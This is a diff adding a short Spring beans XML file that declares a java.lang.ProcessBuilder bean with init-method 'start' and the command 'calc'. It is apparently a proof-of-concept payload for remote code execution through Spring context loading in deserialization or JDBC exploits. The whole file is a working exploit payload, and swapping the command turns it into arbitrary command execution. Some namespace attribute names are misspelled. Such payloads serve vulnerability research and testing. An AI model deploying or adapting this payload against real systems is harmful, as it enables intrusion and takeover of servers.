@@ -1,0 +1,14 @@
+<beans xmls="http://www.springframework.org/schema/beans"
+  xmls:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsiLschemaLocation="
+	http://www.springframework.org/schema/beans
+	http://www.springframework.org/schema/beans/spring-beans.xsd
+">
+	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+		<constructor-arg>
+			<list value-type="java.lang.String">
+				<value>calc</value>
+			</list>
+		</constructor-arg>
+	</bean>
+</beans>
